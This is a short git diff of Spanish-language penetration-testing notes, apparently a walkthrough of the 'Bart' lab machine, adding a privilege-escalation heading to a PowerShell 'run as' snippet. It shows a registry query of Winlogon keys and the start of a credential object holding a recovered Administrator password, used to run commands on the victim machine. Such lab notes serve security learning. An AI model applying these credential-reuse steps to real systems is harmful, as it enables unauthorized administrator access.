@@ -190,12 +190,15 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
 
 ```
+## Privilege Escalation
 
 ### Powershell “run as”
 
 Que quiere decir correr como eso quiere decir que lo vas a correr en la maquina victima vas a correr un comando como otro usuario en el caso de la maquina bart pues como Administrator ya que tenemos el password:
 
 ```
+PS C:\Users\Administrator\Documents>
+
 $username = "BART\Administrator"
 $password = "3130438f31186fbaf962f407711faddb"
 $secstr = New-Object -TypeName System.Security.SecureString
